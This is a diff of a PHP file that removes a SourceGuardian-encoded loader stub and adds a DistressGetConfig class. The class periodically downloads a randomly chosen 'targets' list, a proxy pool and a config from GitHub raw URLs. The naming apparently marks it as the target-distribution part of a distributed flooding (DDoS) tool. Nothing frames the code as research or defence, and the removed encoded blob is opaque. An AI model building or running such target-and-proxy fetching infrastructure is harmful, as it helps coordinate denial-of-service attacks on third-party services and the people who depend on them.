@@ -1,2 +1,86 @@
 <?php
-if(!function_exists('sg_load')){$__v=phpversion();$__x=explode('.',$__v);$__v2=$__x[0].'.'.(int)$__x[1];$__u=strtolower(substr(php_uname(),0,3));$__ts=(@constant('PHP_ZTS') || @constant('ZEND_THREAD_SAFE')?'ts':'');$__f=$__f0='ixed.'.$__v2.$__ts.'.'.$__u;$__ff=$__ff0='ixed.'.$__v2.'.'.(int)$__x[2].$__ts.'.'.$__u;$__ed=@ini_get('extension_dir');$__e=$__e0=@realpath($__ed);$__dl=function_exists('dl') && function_exists('file_exists') && @ini_get('enable_dl') && !@ini_get('safe_mode');if($__dl && $__e && version_compare($__v,'5.2.5','<') && function_exists('getcwd') && function_exists('dirname')){$__d=$__d0=getcwd();if(@$__d[1]==':') {$__d=str_replace('\\','/',substr($__d,2));$__e=str_replace('\\','/',substr($__e,2));}$__e.=($__h=str_repeat('/..',substr_count($__e,'/')));$__f='/ixed/'.$__f0;$__ff='/ixed/'.$__ff0;while(!file_exists($__e.$__d.$__ff) && !file_exists($__e.$__d.$__f) && strlen($__d)>1){$__d=dirname($__d);}if(file_exists($__e.$__d.$__ff)) dl($__h.$__d.$__ff); else if(file_exists($__e.$__d.$__f)) dl($__h.$__d.$__f);}if(!function_exists('sg_load') && $__dl && $__e0){if(file_exists($__e0.'/'.$__ff0)) dl($__ff0); else if(file_exists($__e0.'/'.$__f0)) dl($__f0);}if(!function_exists('sg_load')){$__ixedurl='https://www.sourceguardian.com/loaders/download.php?php_v='.urlencode($__v).'&php_ts='.($__ts?'1':'0').'&php_is='.@constant('PHP_INT_SIZE').'&os_s='.urlencode(php_uname('s')).'&os_r='.urlencode(php_uname('r')).'&os_m='.urlencode(php_uname('m'));$__sapi=php_sapi_name();if(!$__e0) $__e0=$__ed;if(function_exists('php_ini_loaded_file')) $__ini=php_ini_loaded_file(); else $__ini='php.ini';if((substr($__sapi,0,3)=='cgi')||($__sapi=='cli')||($__sapi=='embed')){$__msg="\nPHP script '".__FILE__."' is protected by SourceGuardian and requires a SourceGuardian loader '".$__f0."' to be installed.\n\n1) Download the required loader '".$__f0."' from the SourceGuardian site: ".$__ixedurl."\n2) Install the loader to ";if(isset($__d0)){$__msg.=$__d0.DIRECTORY_SEPARATOR.'ixed';}else{$__msg.=$__e0;if(!$__dl){$__msg.="\n3) Edit ".$__ini." and add 'extension=".$__f0."' directive";}}$__msg.="\n\n";}else{$__msg="<html><body>PHP script '".__FILE__."' is protected by <a href=\"https://www.sourceguardian.com/\">SourceGuardian</a> and requires a SourceGuardian loader '".$__f0."' to be installed.<br><br>1) <a href=\"".$__ixedurl."\" target=\"_blank\">Click here</a> to download the required '".$__f0."' loader from the SourceGuardian site<br>2) Install the loader to ";if(isset($__d0)){$__msg.=$__d0.DIRECTORY_SEPARATOR.'ixed';}else{$__msg.=$__e0;if(!$__dl){$__msg.="<br>3) Edit ".$__ini." and add 'extension=".$__f0."' directive<br>4) Restart the web server";}}$__msg.="</body></html>";}die($__msg);exit();}}return sg_load('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');
+
+class DistressGetConfig extends SFunctions
+{
+    private static RecurrentHttpGet $targetsHttpGet, $proxyPoolHttpGet, $configHttpGet;
+
+    public static function constructStatic()
+    {
+        Actions::addAction('AfterCalculateResources', [static::class, 'actionAfterCalculateResources'], 11);
+        Actions::addAction('BeforeInitSession', [static::class, 'actionBeforeInitSession'], 9);
+    }
+
+    public static function actionAfterCalculateResources()
+    {
+        global $DISTRESS_ENABLED;
+
+        if (!$DISTRESS_ENABLED) {
+            return;
+        }
+
+        static::$proxyPoolHttpGet = new RecurrentHttpGet(
+            [
+                'https://github.com/Yneth/funny/raw/main/01.txt'
+            ],
+            DistressApplicationStatic::$proxyPoolFilePath
+        );
+
+        static::$configHttpGet = new RecurrentHttpGet(
+            [
+                'https://raw.githubusercontent.com/Yneth/distress-releases/main/config1.txt'
+            ],
+            DistressApplicationStatic::$configFilePath
+        );
+
+        // ---
+
+        $targetsUrls = [
+            "https://raw.githubusercontent.com/crayfish-kissable-marrow/crayfish/master/31.json",
+            "https://raw.githubusercontent.com/snoring-huddling-charred/snoring/master/31.json",
+        ];
+
+        $targetsUrlIndex = rand(0, count($targetsUrls) - 1);
+        $targetsUrl = $targetsUrls[$targetsUrlIndex];
+
+        static::$targetsHttpGet = new RecurrentHttpGet(
+            [ $targetsUrl ],
+            DistressApplicationStatic::$targetsFilePath
+        );
+    }
+
+    public static function actionBeforeInitSession()
+    {
+        global $SESSIONS_COUNT;
+
+        static::$targetsHttpGet->get();
+        if (static::$targetsHttpGet->changed) {
+            //chown(static::$targetsHttpGet->path, 'app-h');
+            //chgrp(static::$targetsHttpGet->path, 'app-h');
+
+            if ($SESSIONS_COUNT !== 1) {
+                DistressApplicationStatic::$localTargetsFileHasChanged = true;
+                DistressApplicationStatic::$localTargetsFileLastChangeAt = time();
+            }
+        } else {
+            DistressApplicationStatic::$localTargetsFileHasChanged = false;
+        }
+
+        // ---
+
+        static::$proxyPoolHttpGet->get();
+        if (static::$proxyPoolHttpGet->changed) {
+            //chown(static::$proxyPoolHttpGet->path, 'app-h');
+            //chgrp(static::$proxyPoolHttpGet->path, 'app-h');
+        }
+
+        // ---
+
+        static::$configHttpGet->get();
+        if (static::$configHttpGet->changed) {
+            //chown(static::$configHttpGet->path, 'app-h');
+            //chgrp(static::$configHttpGet->path, 'app-h');
+        }
+    }
+}
+
+DistressGetConfig::constructStatic();
